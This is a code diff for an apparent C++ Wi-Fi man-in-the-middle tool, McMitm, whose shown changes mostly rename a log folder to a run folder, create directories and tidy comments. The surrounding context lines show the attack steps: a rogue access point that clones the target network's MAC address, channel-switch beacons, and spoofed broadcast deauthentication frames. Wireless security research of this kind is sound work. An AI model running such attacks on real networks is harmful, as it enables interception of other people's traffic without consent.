@@ -19,14 +19,15 @@ using namespace Tins;
 
 
 McMitm::McMitm(const ActorPtr &rogue_sta, const ActorPtr &rogue_ap, const ActorPtr &ap,
-				const string &client_mac, optional<filesystem::path> log_folder, const bool only_to_mitm
+				const string &client_mac, optional<filesystem::path> run_folder, const bool only_to_mitm
 )
 : rogue_sta(rogue_sta),
 rogue_ap(rogue_ap),
 ap(ap),
-// TODO fallback to info from actors
 only_to_mitm(only_to_mitm),
-client_state(client_mac, std::move(log_folder)){}
+client_state(client_mac, run_folder ? optional{run_folder.value() / "observer" / "client_state"} : nullopt) {
+	if (run_folder) { create_public_dirs( run_folder.value() / "observer" / "client_state"); }
+}
 
 McMitm::~McMitm(){ stop(); }
 
@@ -156,7 +157,7 @@ void McMitm::run(RunStatus &rs, const int timeout_sec){
 	const string nic_client_ap = AP_IFACE_PREFIX + "client_ack"; //FIXME hardcoded
 	if(start_nic_real_ap){
 		rogue_sta->set_mac_address(client_state.get_mac());
-		// client need to ACK -> needs ap
+		// client need to ACK -> AP
 		start_ap(rs, nic_client_ap, rogue_sta, netconfig.real_channel, *beacon, client_state.get_mac());
 	} else{
 		hw_capabilities::set_iface_down(nic_client_ap, rogue_sta[SK::netns]);
@@ -184,7 +185,8 @@ void McMitm::run(RunStatus &rs, const int timeout_sec){
 	log(LogLevel::INFO, "Setting MAC address of {} to {}", rogue_ap->get_ap_iface(), ap.get(SK::mac));
 	rogue_ap->set_iface_up();
 	rogue_ap->set_mac_address(ap.get(SK::mac));
-	// Set up a rogue AP that clones the target network -> ACK back to client
+
+	// rogue AP  ACK  AP(rogue) -> back to client
 	start_ap(rs, rogue_ap->get_ap_iface(), rogue_ap, netconfig.rogue_channel, *beacon, ap.get(SK::mac));
 	//hw_capabilities::run_cmd({"iw", "dev", nic_real_ap, "station", "add", client_mac.to_string()}, rogue_sta-[SK::netns], false);
 
@@ -198,7 +200,7 @@ void McMitm::run(RunStatus &rs, const int timeout_sec){
 	send_csa_beacon(4);
 	client_state.update_state(ClientState::Sent_to_rogue);
 
-	/* only for non MFP requests*/
+	// only for non MFP requests
 	Dot11Deauthentication deauth{};
 	deauth.addr1(HWAddress<6>::broadcast);
 	deauth.addr2(ap.get(SK::mac));
@@ -218,7 +220,7 @@ void McMitm::run(RunStatus &rs, const int timeout_sec){
 			break;
 		}
 
-		// Wait up to 100ms for data on either socket — mirrors Python select(..., 0.1)
+		// wait up to 100ms for data on either socket — mirrors Python select(..., 0.1)
 		const int fd_real = pcap_get_selectable_fd(sock_real->get_pcap_handle());
 		const int fd_rogue = pcap_get_selectable_fd(sock_rogue->get_pcap_handle());
 
